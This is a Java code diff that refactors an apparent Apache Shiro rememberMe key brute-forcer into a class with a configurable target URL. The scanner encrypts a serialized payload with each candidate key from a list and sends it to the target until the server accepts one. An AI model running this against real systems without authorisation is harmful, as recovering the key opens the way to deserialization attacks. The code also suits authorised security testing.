@@ -1,16 +1,25 @@
 package core.scan;
 
+import core.conn.ShiroHttpConnection;
 import core.payload.ScanKey;
 import core.util.Util;
 
 import java.io.File;
 import java.util.Scanner;
 
-public class Scan {
+public class KeyScanner implements ShiroScanner {
 
     private static final ShiroHttpConnection connection = new ShiroHttpConnection();
 
-    public static void main(String[] args) throws Exception {
+    private String base;
+
+    @Override
+    public void setBase(String base) {
+        this.base = base;
+    }
+
+    @Override
+    public void scan() throws Exception {
         Scanner scanner = new Scanner(new File("src/main/resources/key"));
         String key = "";
         boolean rightKey = true;
@@ -21,8 +30,11 @@ public class Scan {
             byte[] serialize = util.serialize(scanKey.getObjectPayload());
             String rememberMe = util.getRememberMe(serialize, key);
             System.out.println("[+] Test key: " + key);
-            rightKey = !connection.checkKey("http://127.0.0.1:8000/login.jsp", rememberMe);
+            rightKey = !connection.checkKey(base, rememberMe);
         }
         System.err.println("[*] Find Key: " + key);
+    }
+
+    public static void main(String[] args) throws Exception {
     }
 }
